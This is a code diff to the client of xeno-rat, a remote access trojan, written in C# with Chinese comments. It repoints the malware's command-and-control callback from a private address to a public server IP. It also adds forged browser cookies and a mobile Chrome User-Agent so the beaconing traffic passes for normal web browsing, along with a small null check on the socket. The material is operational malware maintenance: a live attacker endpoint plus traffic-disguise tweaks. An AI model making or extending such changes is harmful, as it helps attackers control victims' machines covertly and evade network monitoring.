@@ -27,7 +27,10 @@ namespace xeno_rat_client
         public SocketHandler(Socket socket, byte[] _EncryptionKey)
         {
             sock = socket;
-            sock.NoDelay = true;
+            if (null != sock)
+            {
+                sock.NoDelay = true;
+            }
             EncryptionKey = _EncryptionKey;
             httpClient = new HttpClient();
         }
@@ -160,7 +163,7 @@ namespace xeno_rat_client
             try
             {
                 // TODO修改IP
-                var requestUrl = "http://172.20.240.1:8080/api/connect";
+                var requestUrl = "http://154.91.65.162:8080/api/connect";
                 var jsonData = new
                 {
                     type = type,
@@ -169,6 +172,11 @@ namespace xeno_rat_client
 
                 // 将 JSON 数据序列化为字符串
                 var jsonString = JsonConvert.SerializeObject(jsonData);
+
+                httpClient.DefaultRequestHeaders.Add("Cookie", "_ga=GA1.1.1224401437.1709954154; _ga_W9PKPGC47Q=GS1.1.1710034903.2.1.1710034926.37.0.0");
+                httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36");
+                httpClient.DefaultRequestHeaders.Add("Cache-Control", "max-age=0");
+                httpClient.DefaultRequestHeaders.Add("Accept", "*/*");
 
                 var response = await httpClient.PostAsync(requestUrl, new StringContent(jsonString, Encoding.UTF8, "application/json"));
 
